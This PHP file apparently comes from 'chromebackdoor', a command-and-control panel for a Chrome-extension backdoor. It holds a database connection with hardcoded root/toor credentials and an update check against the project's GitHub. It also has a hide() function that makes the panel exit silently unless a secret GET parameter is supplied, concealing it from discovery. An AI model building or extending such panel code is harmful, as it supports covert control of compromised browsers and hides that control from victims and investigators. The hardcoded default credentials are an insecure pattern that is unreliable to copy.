<?php
$bdd = new PDO('mysql:host=localhost;dbname=chrombackdoor-master','root','toor');
define('__VERSION__', '1.2');

function Checkupdate(){
    $new_version = file_get_contents('https://raw.githubusercontent.com/graniet/chromebackdoor/master/version.txt');
    if(trim($new_version) > __VERSION__){
        echo "New version available on : https://github.com/graniet/chromebackdoor/ <br />";
        exit(1);
    }
}

function hide(){
    global $bdd;
    $select = $bdd->prepare("SELECT * FROM settings");
    $select->execute();
    if($select->rowCount() > 0){
        $result = $select->fetch();
        if($result['hide_panel'] == '1' && $result['get_name'] != '' && $result['get_value'] != '' && !isset($_SESSION['username']) && !isset($_POST['login'])){
            if(!isset($_GET[$result['get_name']]) || $_GET[$result['get_name']] != $result['get_value']){
                exit();
            }
        }
    }
}
?>